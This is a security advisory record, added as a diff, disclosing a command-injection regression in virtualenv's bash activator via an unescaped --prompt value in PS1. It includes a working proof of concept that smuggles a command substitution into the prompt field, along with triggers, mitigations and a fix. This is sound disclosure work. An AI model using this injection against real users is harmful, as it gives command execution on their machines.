@@ -1,0 +1,63 @@
+{
+  "id": "GHSA-cx6f-vjhg-g3cc",
+  "modified": "2026-10-23T21:00:06.246911841Z",
+  "published": "2026-10-23T20:47:16Z",
+  "aliases": [
+    "CVE-2026-115586"
+  ],
+  "summary": "virtualenv: Bash activator leaves the --prompt value unescaped in PS1 when promptvars is off, so prompt expansion later executes it (regression in 21.14.9)",
+  "details": "## Summary\n\nThe bash activator puts the caller-supplied prompt value into `PS1` unescaped whenever `promptvars` is off at activation time, and assumes prompt expansion can never run afterwards. `promptvars` and posix mode are runtime shell state, not a property of the activation moment: re-enabling prompt expansion in the same shell (`shopt -s promptvars`, `set -o posix`) or starting an interactive child bash that inherits the exported `PS1` makes bash expand the stored value and run the command substitution in it. An attacker who controls the prompt value gets command execution as the user who sources `bin/activate`.\n\nThis is a regression. 21.14.8 escaped `$` and the backtick unconditionally and stays inert under the same sequence. The 21.14.9 fix for GHSA-6w3r-xr62-4xcp (#3418) rewrote that block and left bash with a path that stores the raw value whenever `promptvars` is off.\n\n## Affected area\n\nActivation scripts (activate, activate.bat, activate.csh, activate.fish, activate.nu, Activate.ps1, activate.xsh) — specifically the bash `bin/activate`.\n\n## Attacker-controlled input\n\nThe `--prompt` value, which the security policy already lists as a value that may come from project metadata the user did not write. It reaches `virtualenv` as `--prompt` on the command line or as the `prompt` argument of the API, is written into `bin/activate` as the literal `VIRTUAL_ENV_PROMPT` assignment (correctly quoted, the value arrives there as data), and the script then copies it into `PS1` without escaping `$` or the backtick.\n\nExample: a repository or tool config supplies a prompt such as `x$(id \u003e /tmp/ve-pwn)y`; the victim creates and later activates the environment.\n\n## Details\n\nSource of the latest release: [`src/virtualenv/activation/bash/activate.sh` lines 140-160](https://github.com/pypa/virtualenv/blob/21.14.12/src/virtualenv/activation/bash/activate.sh#L140-L160)\n\n```sh\nif [ -z \"${VIRTUAL_ENV_DISABLE_PROMPT-}\" ] \u0026\u0026\n    { [ -n \"${BASH_VERSION-}\" ] || [ -n \"${ZSH_VERSION-}\" ]; }; then\n    _OLD_VIRTUAL_PS1=\"${PS1-}\"\n    # bash expands PS1 after decoding its prompt escapes when promptvars is on or in posix mode, so the prompt holds a\n    # reference to the variable and its value never reaches that expansion; otherwise only the decode runs and\n    # backslashes need doubling. ...\n    if [ -n \"${BASH_VERSION-}\" ] \u0026\u0026 { shopt -q promptvars || shopt -qo posix; }; then\n        PS1='(${VIRTUAL_ENV_PROMPT-}) '\"${PS1-}\"\n    else\n        _VIRTUAL_PROMPT=\"${VIRTUAL_ENV_PROMPT//\\\\/\\\\\\\\}\"\n        if [ -n \"${ZSH_VERSION-}\" ]; then\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\$/\\\\\\$}\"\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\`/\\\\\\`}\"\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\%/%%}\"\n        fi\n        PS1=\"(${_VIRTUAL_PROMPT}) ${PS1-}\"\n        unset _VIRTUAL_PROMPT\n    fi\nfi\n```\n\nTwo separate mistakes combine:\n\n1. A runtime shell option is treated as a constant. `shopt -u promptvars` at the moment of `source` does not bind the shell forever: `shopt -s promptvars` and `set -o posix` both re-enable PS1 expansion in the same shell. The code itself tests `shopt -qo posix` because posix mode expands the prompt regardless of `promptvars`, which shows the expansion state is not fixed by the activation.\n2. The escaping that would keep the value inert in that mode is missing for bash. GHSA-5vjq-rrrf-7h2q (\"activate runs commands from the environment name in zsh with PROMPT_SUBST\") fixed exactly this shape for zsh, reasoning that \"a user can set it after activation\", by escaping `$` and the backtick. Bash lost the equivalent escaping in the same commit that added the zsh branch.\n\nThe rendered prompt shows the regression directly:\n\n```\n21.14.8   PS1 = (x\\\\$(id \u003e /tmp/ve-pwn)y)       \u003c- escaped, inert\n21.14.9   PS1 = (x$(id \u003e /tmp/ve-pwn)y)         \u003c- raw value\n21.14.12  PS1 = (x$(id \u003e /tmp/ve-pwn)y)         \u003c- raw value\n```\n\nRelevant commit: [`5f48d711` \"fix(bash): preserve literal prompts in supported shells (#3418)\"](https://github.com/pypa/virtualenv/commit/5f48d711731311428aebfae61d46957762155b22), which removed the unconditional `$`/backtick escaping from the bash path. Advisory for that change: [GHSA-6w3r-xr62-4xcp](https://github.com/pypa/virtualenv/security/advisories/GHSA-6w3r-xr62-4xcp).\n\n## Proof of concept\n\nNon-destructive payload: it runs `id` and writes the output to a file.\n\n```bash\npython -m virtualenv --no-seed --no-periodic-update --activators bash \\\n    --prompt 'x$(id \u003e /tmp/ve-pwn)y' /tmp/venv-demo\n\ncat \u003e /tmp/rc \u003c\u003c'EOF'\nshopt -u promptvars\n. /tmp/venv-demo/bin/activate\nshopt -s promptvars\nEOF\n\n# the prompt needs a tty; script(1) provides one\nprintf 'exit\\n' | script -qec 'bash --noprofile --rcfile /tmp/rc -i' /dev/null\n\ncat /tmp/ve-pwn\n```\n\nObserved on 21.14.12:\n\n```\n$ cat /tmp/ve-pwn\nuid=1000(asrun) gid=1000(asrun) groups=1000(asrun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),999(ollama)\n```\n\nThe prompt printed as `(xy)`. The same script against 21.14.8 creates no file; against 21.14.9 and 21.14.12 it does.\n\nTriggers, all run in a pty, activation itself never executing anything; execution happens at the next prompt redraw after prompt expansion is enabled:\n\n| After `. bin/activate` (activated with `shopt -u promptvars`) | 21.14.8 | 21.14.9 | 21.14.12 |\n| --- | --- | --- | --- |\n| `shopt -s promptvars` | inert | executes | executes |\n| `set -o posix` | inert | executes | executes |\n| `export PS1`, then start an interactive child `bash` (its `promptvars` defaults to on) | inert | executes | executes |\n| control: activation with default options | inert | inert | inert |\n| control: activation with `set -o posix` already on | inert | inert | inert |\n\nThe third trigger needs no explicit option change: the poisoned `PS1` is inherited and the child bash expands it on its first prompt.\n\n`shopt -u promptvars` is a documented way to make an expensive bash prompt cheap and appears in `~/.bashrc` files for that reason; it is also the state left by some prompt wrappers. Whoever sources such an environment gets the unescaped value in `PS1`.\n\n## Impact\n\nCommand execution as the user who sources `bin/activate`, from a value the user may not have written (project metadata or tool config reaching `--prompt`). The value is also persisted in `pyvenv.cfg` and in the generated script, so it survives the activation that created it and fires later, in a different shell session, on the first prompt redraw with expansion enabled. No privilege elevation beyond the activating user.\n\nSeverity: high, matching GHSA-5vjq-rrrf-7h2q for the same class of prompt-expansion command injection reached by toggling a shell option after activation. If you consider the `promptvars` state a caller-controlled condition rather than a shell condition, this is medium; the fix is the same either way.\n\n## Versions tested\n\nvirtualenv 21.14.12 and 21.14.9 (affected), virtualenv 21.14.8 (unaffected control); CPython 3.14.7; Linux 6.x (WSL2); bash 5.1.16(1)-release. `--prompt` handling is platform independent; zsh/fish/csh/nu/PowerShell activators were not part of this report.\n\n## Known mitigation\n\nFor a user: activate with `promptvars` left at its default, or set `VIRTUAL_ENV_DISABLE_PROMPT=1` before activating, which skips the whole prompt block. Do not pass an untrusted value to `--prompt`.\n\nFix in the activator: escape `$` and the backtick for bash as well, in both branches, with a single backslash (`$` -\u003e `\\$`, backtick -\u003e ``\\` ``, `\\` -\u003e `\\\\`). Verified on bash 5.1.16 that a `PS1` built that way is inert with `promptvars` on, with `promptvars` off, and with `promptvars` off followed by posix mode, while still rendering the literal value on screen. That is better than both current shapes: 21.14.8's four-level escaping left stray backslashes on screen, which is why the block was rewritten.\n\n```sh\n    else\n        _VIRTUAL_PROMPT=\"${VIRTUAL_ENV_PROMPT//\\\\/\\\\\\\\}\"\n        _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\$/\\\\\\$}\"\n        _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\`/\\\\\\`}\"\n        if [ -n \"${ZSH_VERSION-}\" ]; then\n            _VIRTUAL_PROMPT=\"${_VIRTUAL_PROMPT//\\%/%%}\"\n        fi\n        PS1=\"(${_VIRTUAL_PROMPT}) ${PS1-}\"\n```\n\nFor the tests, `tests/unit/activation/test_bash.py::test_bash_prompt_options` already parametrises `(\"before\", \"after\", \"expected\")` and covers `before=\"shopt -u promptvars\"` with `after=\"\"`. The missing axis is the transition: `(\"shopt -u promptvars\", \"shopt -s promptvars\", ...)` and `(\"shopt -u promptvars\", \"set -o posix\", ...)`, with the existing `PWNED` check asserting no file was created.\n\n## Latest release\n\n- [x] The problem reproduces on the latest virtualenv release.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "virtualenv",
+        "purl": "pkg:pypi/virtualenv"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "21.14.9"
+            },
+            {
+              "fixed": "21.14.13"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "21.14.10",
+        "21.14.11",
+        "21.14.12",
+        "21.14.9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-cx6f-vjhg-g3cc/GHSA-cx6f-vjhg-g3cc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/security/advisories/GHSA-cx6f-vjhg-g3cc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/pull/3466"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/commit/3598e201f6f044e389136b2347a8a919ac03c5f4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pypa/virtualenv"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/virtualenv/releases/tag/21.14.13"
+    }
+  ]
+}
